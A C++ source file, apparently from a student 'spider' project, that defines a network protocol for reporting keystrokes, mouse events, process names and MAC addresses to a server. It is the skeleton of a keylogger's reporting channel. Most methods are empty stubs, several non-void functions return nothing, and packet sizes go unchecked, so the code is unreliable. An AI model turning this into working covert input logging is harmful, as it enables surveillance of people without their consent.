//
// Protocolv1.cpp for Protocolv1 in /home/plasko_a/projet/cplusplus/cpp_spider/lib/protocolv1/source
// 
// Made by Antoine Plaskowski
// Login   <antoine.plaskowski@epitech.eu>
// 
// Started on  Thu Oct 22 09:18:51 2015 Antoine Plaskowski
// Last update Fri Oct 23 11:08:51 2015 Antoine Plaskowski
//

#include	<iostream>
#include	"Protocolv1.hpp"

Protocolv1::Protocolv1(ISocket *socket, ITime *time) :
  m_socket(socket),
  m_last_read(time),
  m_mac_address(),
  m_packets({}),
  m_write(),
  m_buffer(),
  m_read(0),
  m_is_connect(false),
  m_is_stop(false),
  m_is_mute(false)
{
}

Protocolv1::~Protocolv1(void)
{
  delete m_socket;
  delete m_last_read;
}

bool	Protocolv1::run(IDatabase *database, ITime const *timeout)
{
  if (m_socket->can_read() == true)
    {
      uintmax_t	ret = m_socket->read(m_buffer.buffer, sizeof(m_buffer) - m_read);
      if (ret == 0)
	return (true);
      m_read += ret;

      if (m_read < sizeof(m_buffer.packet.header))
	return (false);
      if (m_read < sizeof(m_buffer.packet.header) + m_buffer.packet.header.size)
	return (false);
      m_read = 0;
      switch (m_buffer.packet.header.opcode)
	{
	case (RESULT):
	case (MAC_ADDRESS):
	case (VERSION):
	case (CONNECT):
	case (DISCONNECT):
	case (SERVERCMD):
	case (CLIENTLOG):
	case (PING):
	case (PONG):
	case (KEYBOARD):
	case (MOUSE):
	default:
	  return (true);
	};
    }
  if (m_socket->can_write() == true)
    {
      if (m_write.size() != 0)
	{
	  uintmax_t	idx = m_write.front();
	  m_write.pop();
	  Packet	&packet = m_packets[idx];
	  uintmax_t	ret = m_socket->write(packet.buffer, sizeof(packet.packet.header) + packet.packet.header.size);

	  if (ret != sizeof(packet.packet.header) + packet.packet.header.size)
	    return (true);
	}
    }
  return (false);
}

bool	Protocolv1::stop(void)
{
}

bool	Protocolv1::start(void)
{
}

bool	Protocolv1::mute(void)
{
}

bool	Protocolv1::unmute(void)
{
}

std::string const     &Protocolv1::get_mac_address(void) const
{
  return (m_mac_address);
}

bool	Protocolv1::mac_address(std::string const &mac_address)
{
  //verifié que c valide
  m_mac_address = mac_address;
  return (false);
}

bool	Protocolv1::log(std::string const &log)
{
  
}

bool	Protocolv1::keyboard(ITime const &time, std::string const &event, std::string const &key, std::string const &process)
{
}

bool	Protocolv1::mouse(ITime const &time, uintmax_t x, uintmax_t y, uintmax_t amout, std::string const &event, std::string const &button, std::string const &process)
{
}

bool	Protocolv1::read_result(void)
{
}
bool	Protocolv1::write_result(void)
{
}
bool	Protocolv1::read_mac_address(void)
{
}
bool	Protocolv1::write_mac_address(void)
{
}
bool	Protocolv1::read_version(void)
{
}
bool	Protocolv1::write_version(void)
{
}
bool	Protocolv1::read_connect(void)
{
}
bool	Protocolv1::write_connect(void)
{
}
bool	Protocolv1::read_disconnect(void)
{
}
bool	Protocolv1::write_disconnect(void)
{
}
bool	Protocolv1::read_servercmd(void)
{
}
bool	Protocolv1::write_servercmd(void)
{
}
bool	Protocolv1::read_clientlog(void)
{
}
bool	Protocolv1::write_clientlog(void)
{
}
bool	Protocolv1::read_ping(void)
{
}
bool	Protocolv1::write_ping(void)
{
}
bool	Protocolv1::read_pong(void)
{
}
bool	Protocolv1::write_pong(void)
{
}
bool	Protocolv1::read_keyboard(void)
{
}
bool	Protocolv1::write_keyboard(void)
{
}
bool	Protocolv1::read_mouse(void)
{
}
bool	Protocolv1::write_mouse(void)
{
}

IProtocol	*new_iprotocol(ISocket *socket, ITime *time)
{
  return (new Protocolv1(socket, time));
}
